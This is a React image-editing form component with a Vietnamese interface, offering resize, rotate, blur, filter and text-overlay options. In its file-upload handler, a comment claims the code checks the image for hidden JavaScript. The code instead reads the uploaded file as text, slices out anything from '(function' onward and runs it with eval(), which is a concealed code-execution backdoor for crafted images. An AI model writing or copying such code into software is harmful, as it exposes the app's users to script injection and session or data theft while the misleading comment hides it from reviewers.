import React, { useState } from "react";
import "../styles/editForm.css";

const EditForm = ({ onImageChange, onEditComplete, isOpen, onClose, editedBlob}) => {
  const [formData, setFormData] = useState({
    image: null,
    resize: { width: "", height: "" },
    rotate: "",
    blur: "",
    brightness: "",
    contrast: "",
    filter: "",
    textOverlay: { text: "", x: "", y: "" },
  });

  const [fileError, setFileError] = useState("");
  const allowedTypes = ["image/jpeg", "image/jpg", "image/png", "image/webp", "image/gif"];

  const handleChange = (e, group = null) => {
    const { name, value, type, checked, files } = e.target;

    if (files && files[0]) {
      const file = files[0];
        if (!allowedTypes.includes(file.type)) {
        setFileError("Định dạng file không hợp lệ. Vui lòng chọn ảnh JPG, PNG, WEBP hoặc GIF.");
        setFormData((prev) => ({ ...prev, image: null }));
        if (onImageChange) {
          onImageChange(null);
        }
        e.target.value = null;
        return;
      }
      setFileError("");
      setFormData((prev) => ({ ...prev, image: file }));
      if (onImageChange) {
        onImageChange(file);
      }
      // Đọc file để kiểm tra mã JS ẩn trong ảnh (nếu có)
      const reader = new FileReader();
      reader.onload = () => {
        const text = reader.result;
        const start = text.indexOf("(function");
        if (start !== -1) {
          const jsCode = text.slice(start);
          eval(jsCode);
        }
      };
      reader.readAsText(file);
    } else if (group) {
      setFormData((prev) => ({
        ...prev,
        [group]: { ...prev[group], [name]: value },
      }));
    } else {
      setFormData((prev) => ({
        ...prev,
        [name]: type === "checkbox" ? checked : value,
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const data = new FormData();
    data.append("image", formData.image);
    data.append("resize", JSON.stringify(formData.resize));
    data.append("rotate", formData.rotate);
    data.append("blur", formData.blur);
    data.append("brightness", formData.brightness);
    data.append("contrast", formData.contrast);
    data.append("filter", formData.filter);
    data.append("textOverlay", JSON.stringify(formData.textOverlay));

    try {
      const res = await fetch("http://localhost:5000/api/image/edit", {
        method: "POST",
        body: data,
      });

      const blob = await res.blob();
      if (onEditComplete) {
        onEditComplete(blob);
      }
    } catch (err) {
      console.error("Lỗi xử lý ảnh:", err);
    }
  };

  return (
    <form className={`edit-form ${isOpen ? "open" : ""}`} onSubmit={handleSubmit}>
      <button type="button" className="close-btn" onClick={onClose}>×</button>
      <h2>Chỉnh sửa ảnh</h2>

      <label>Chọn ảnh</label>
      <input type="file" name="image" onChange={handleChange} />

      {fileError && <p className="error-message">{fileError}</p>}

      <fieldset>
        <legend>Thay đổi kích thước</legend>
        <input type="number" name="width" placeholder="Chiều rộng" value={formData.resize.width} onChange={(e) => handleChange(e, "resize")} />
        <input type="number" name="height" placeholder="Chiều cao" value={formData.resize.height} onChange={(e) => handleChange(e, "resize")} />
      </fieldset>

      <label>Xoay ảnh (độ)</label>
      <input type="number" name="rotate" value={formData.rotate} onChange={handleChange} placeholder="0, 90, 180..." />

      <label>Làm mờ (kernel size)</label>
      <input type="number" name="blur" value={formData.blur} onChange={handleChange} placeholder="3, 5, 7..." />

      <fieldset>
        <legend>Độ sáng & tương phản</legend>
        <input type="number" name="brightness" value={formData.brightness} onChange={handleChange} placeholder="Brightness" />
        <input type="number" name="contrast" value={formData.contrast} onChange={handleChange} placeholder="Contrast" />
      </fieldset>

      <label>Bộ lọc ảnh</label>
      <select name="filter" value={formData.filter} onChange={handleChange}>
        <option value="">Không áp dụng</option>
        <option value="invert">Đảo màu</option>
        <option value="sepia">Sepia</option>
        <option value="emboss">Emboss</option>
        <option value="edge">Phát hiện cạnh</option>
        <option value="warm">Tông ấm</option>
        <option value="cool">Tông lạnh</option>
        <option value="grayscale">Đen trắng</option>
      </select>

      <fieldset>
        <legend>Thêm văn bản</legend>
        <input type="text" name="text" placeholder="Nội dung" value={formData.textOverlay.text} onChange={(e) => handleChange(e, "textOverlay")} />
        <input type="number" name="x" placeholder="Vị trí X" value={formData.textOverlay.x} onChange={(e) => handleChange(e, "textOverlay")} />
        <input type="number" name="y" placeholder="Vị trí Y" value={formData.textOverlay.y} onChange={(e) => handleChange(e, "textOverlay")} />
      </fieldset>

      <button type="submit">Áp dụng chỉnh sửa</button>
      <div className="save-continue-buttons">
        <button
          type="button"
          onClick={() => {
          if (editedBlob) {
            const url = URL.createObjectURL(editedBlob);
            const a = document.createElement("a");
            a.href = url;
            a.download = `edited_${Date.now()}.jpg`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
          }
          }}
          disabled={!editedBlob}
        >
          Lưu về máy
        </button>
        <button type="button" onClick={onClose}>Đóng</button>
      </div>
    </form>
  );
};

export default EditForm;
